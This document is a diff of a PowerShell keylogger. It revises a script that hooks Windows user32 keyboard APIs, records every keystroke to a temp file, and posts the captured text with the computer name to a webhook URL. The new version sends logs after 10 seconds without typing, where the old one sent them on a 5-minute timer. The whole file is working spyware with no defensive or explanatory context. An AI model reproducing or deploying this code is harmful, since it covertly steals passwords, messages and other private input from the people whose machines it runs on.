@@ -1,15 +1,7 @@
-﻿
+$hookurl = "$dc"
 
-$RunTimeP = 5 # Interval (in minutes) between each post
-$whuri = "$dc"
-
-Do{
-$apip = 1
-Start-Sleep 4
-$ttrun = 1
-$tstrt = Get-Date
-$tend = $tstrt.addminutes($RunTimeP)
-function Start-Logs($Path = "$env:temp\chars.txt") {$sigs = @'
+# Import DLL Definitions for keyboard inputs
+$API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -19,35 +11,67 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru  
-$null = New-Item -Path $Path -ItemType File -Force
+
+# Add Definitions and save file
+$logPath = "$env:temp/t.txt"
+$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+$no = New-Item -Path $logPath -ItemType File -Force
+$fileContent = Get-Content -Path $logPath -Raw
+
+# Add stopwatch for intellegent sending
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+
+# Start a continuous loop
+While ($true){
+$keyPressed = $false
 try{
-    Start-Sleep 1
-    $run = 0
-	while ($ttrun  -ge $run) {                              
-	while ($tend -ge $tnow) {
-      Start-Sleep -Milliseconds 30
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        $state = $API::GetAsyncKeyState($ascii)
-        if ($state -eq -32767){
-        $null = [console]::CapsLock
-        $virtualKey = $API::MapVirtualKey($ascii, 3)
-        $kbstate = New-Object Byte[] 256
-        $checkkbstate = $API::GetKeyboardState($kbstate)
-        $mychar = New-Object -TypeName System.Text.StringBuilder
-        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-            if ($success) {[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}$tnow = Get-Date}
-        $msg = Get-Content -Path $Path -Raw 
-        $escmsg = $msg -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-        $json = @{"username" = "$env:COMPUTERNAME" 
-                    "content" = $escmsg} | ConvertTo-Json
-        Start-Sleep 1
-        Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $json
-        Start-Sleep 1
-        Remove-Item -Path $Path -force
-        }
-        }
-finally{}
+
+# Start a loop that checks the time since last activity before message is sent
+while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+
+# Start the loop with 30 ms delay between keystate check
+Start-Sleep -Milliseconds 30
+for ($asc = 9; $asc -le 254; $asc++){
+
+# Get the key state. (is any key currently pressed)
+$keyst = $API::GetAsyncKeyState($asc)
+
+# If a key is pressed
+if ($keyst -eq -32767) {
+
+# Restart the inactivity timer
+$keyPressed = $true
+$LastKeypressTime.Restart()
+$null = [console]::CapsLock
+
+# Translate the keycode to a letter
+$vtkey = $API::MapVirtualKey($asc, 3)
+
+# Get the keyboard state and create stringbuilder
+$kbst = New-Object Byte[] 256
+$checkkbst = $API::GetKeyboardState($kbst)
+$logchar = New-Object -TypeName System.Text.StringBuilder
+
+# Define the key that was pressed          
+if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) 
+{
+# Add the key to the file
+[System.IO.File]::AppendAllText($logPath, $logchar, [System.Text.Encoding]::Unicode) 
+}}}}}
+finally{
+If ($keyPressed) {
+# Send the saved keys to a webhook
+$fileContent = Get-Content -Path $logPath -Raw
+$escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
+#Remove log file and reset inactivity check 
+Remove-Item -Path $logPath -Force
+$keyPressed = $false
+}}
+# reset stopwatch before restarting the loop
+$LastKeypressTime.Restart()
+Start-Sleep -Milliseconds 10
 }
-Start-Logs
-}While ($apip -le 5)
